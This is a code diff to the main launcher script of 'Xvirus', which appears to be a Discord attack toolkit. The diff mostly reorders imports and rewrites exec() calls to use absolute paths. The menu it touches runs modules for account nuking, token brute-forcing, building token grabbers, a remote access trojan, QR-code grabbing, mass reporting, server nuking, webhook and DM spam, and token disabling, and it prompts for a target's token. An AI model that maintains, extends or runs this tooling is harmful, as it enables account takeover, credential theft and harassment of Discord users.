@@ -1,28 +1,38 @@
-from util.plugins.common import *
-from util.webhookgen import *
+import asyncio
 import util.accountNuke
 import util.dmdeleter
+import util.friend_blocker
+import util.groupchat_spammer
 import util.info
 import util.login
-import util.groupchat_spammer
+import util.massdm
 import util.massreport
+import util.profilechanger
+import util.qrgrabb
 import util.seizure
 import util.server_leaver
+import util.servernuker
 import util.spamservers
-import util.profilechanger
-import util.friend_blocker
-import util.unfriender
-import util.webhookspammer
-import util.massdm
 import util.tokendisable
+import util.unfriender
 import util.vanitysniper
-import util.qrgrabb
+import util.webhookspammer
+from util.plugins.common import *
+from util.webhookgen import *
 
 threads = 3
 cancel_key = "ctrl+x"
 current_dir = os.path.dirname(os.path.abspath(__file__))
 
-            
+script_path = os.path.abspath(sys.argv[0])
+script_dir = os.path.dirname(script_path)
+
+rat_path = os.path.join(script_dir, 'util', 'rat.py')
+vanitysniper_path = os.path.join(script_dir, 'util', 'vanitysniper.py')
+dmclear_path = os.path.join(script_dir, 'util', 'dmclear.py')
+nitrogen_path = os.path.join(script_dir, 'util', 'nitrogen.py')
+linkgen_path = os.path.join(script_dir, 'util', 'linkgen.py')
+           
 def main():
     setTitle(f"Xvirus {THIS_VERSION}")
     clear()
@@ -99,29 +109,34 @@ def main():
     elif choice == '4':
         token = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Token: {Fore.RED}')
         validateToken(token)
-        print(f'{Fore.BLUE}Do you want to have a icon for the servers that will be created?')
+        print(f'{Fore.BLUE}Do you want to have an icon for the servers that will be created?')
         yesno = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] yes/no: {Fore.RED}')
+        
         if yesno.lower() == "yes":
             image = input(f'Example: (C:\\Users\\myName\\Desktop\\Xvirus\\ShitOn.png):\n{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Please input the icon location: {Fore.RED}')
             if not os.path.exists(image):
-                print(f'[{Fore.RED}Error] : Couldn\'t find "{image}" on your pc')
+                print(f'[{Fore.RED}Error] : Couldn\'t find "{image}" on your PC')
                 sleep(3)
                 main()
-            with open(image, "rb") as f: _image = f.read()
+            
+            with open(image, "rb") as f:
+                _image = f.read()
             b64Bytes = base64.b64encode(_image)
             icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
         else:
             icon = None
+        
         print(f'''
     [{Fore.RED}1] Random server names
     [{Fore.RED}2] Custom server names  
                         ''')
-        secondchoice = input(
-            f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Second Choice: {Fore.RED}')
+        secondchoice = input(f'{Fore.RED}[{Fore.RED}>>>{Fore.RED}] Second Choice: {Fore.RED}')
+        
         if secondchoice not in ["1", "2"]:
             print(f'[{Fore.RED}Error] : Invalid Second Choice')
             sleep(1)
             main()
+        
         if secondchoice == "1":
             processes = []
             for i in range(25):
@@ -284,10 +299,10 @@ def main():
 
 
     elif choice == '12':
-        exec(open('util/tokenbrute.py').read())
+        exec(open(os.path.join(script_dir, 'util', 'tokenbrute.py')).read())
 
     elif choice == '13':
-        exec(open('util/grabberbuilder.py').read())
+        exec(open(os.path.join(script_dir, 'util', 'grabberbuilder.py')).read())
 
     elif choice == '14':
         WebHook = input(
@@ -368,25 +383,25 @@ def main():
             util.webhookspammer.WebhookSpammer(WebHook, Message)
 
     elif choice == '18':
-        exec(open('util/tokenchecker.py').read())
+        exec(open(os.path.join(script_dir, 'util', 'tokenchecker.py')).read())
 
     elif choice == '19':
         TokenDisable()
 
     elif choice == '20':
-        exec(open('util/rat.py').read())
+        exec(open(rat_path).read())
 
     elif choice == '21':
-        exec(open('util/vanitysniper.py').read())
-        
+        exec(open(vanitysniper_path).read())
+
     elif choice == '22':
-        exec(open('util/dmclear.py').read())
+        exec(open(dmclear_path).read())
 
     elif choice == '23':
-        exec(open('util/nitrogen.py').read())
+        exec(open(nitrogen_path).read())
 
     elif choice == '24':
-        exec(open('util/linkgen.py').read())
+        exec(open(linkgen_path).read())
 
     elif choice == '25':
         generate_and_save_valid_webhook()
